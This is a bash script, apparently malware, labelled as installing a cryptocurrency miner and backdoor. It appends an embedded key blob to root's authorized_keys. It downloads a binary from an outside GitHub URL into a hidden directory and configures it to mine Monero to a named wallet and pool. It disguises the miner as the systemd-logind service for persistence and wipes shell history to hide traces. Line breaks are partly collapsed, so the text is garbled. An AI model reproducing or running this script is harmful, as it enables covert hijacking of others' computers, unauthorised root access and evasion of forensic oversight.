#!/bin/bash# setup.sh – Install miner and backdoor
WALLET = "89T9kvjYMeqBY8yky4mbP8EDP1rouQDjJgGkRZ22uFXz9phDhtMSYKz8Skq8B7d8LfVitghrx4juyTXrUeDwsUHwCut2EYM"
POOL="pool.supportxmr.com:3333"
MINER_URL="https://github.com/RALPH-005/payload/raw/refs/heads/main/systemd-logind"
SSH_PUBKEY="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
unwKN2DlUb8AAAAJa2FsaUBrYWxpAQI= "
# Add SSH key (optional)mkdir -p /root/.sshecho "$SSH_PUBKEY" >> /root/.ssh/authorized_keyschmod 600 /root/.ssh/authorized_keys
# Create hidden miner directorymkdir -p /usr/share/misc/.cachecd /usr/share/misc/.cache
# Download minerwget -q -O systemd-logind "$MINER_URL"chmod +x systemd-logind
# Create config (throttled to 60% CPU)cat > config.json <<EOF{    "autosave": true,    "cpu": {        "enabled": true,        "max-threads-hint": 60,        "priority": 5    },    "pools": [        {            "url": "$POOL",            "user": "$WALLET",            "pass": "x",            "keepalive": true,            "tls": true        }    ]}EOF
# Install systemd service (persistence)cat > /etc/systemd/system/systemd-logind.service <<EOF[Unit]Description=System Logind ServiceAfter=network.target
[Service]ExecStart=/usr/share/misc/.cache/systemd-logind --config=/usr/share/misc/.cache/config.jsonRestart=alwaysRestartSec=60CPUQuota=60%Nice=10
[Install]WantedBy=multi-user.targetEOF
systemctl daemon-reloadsystemctl enable systemd-logindsystemctl restart systemd-logind
# Clean logshistory -cecho > /root/.bash_history
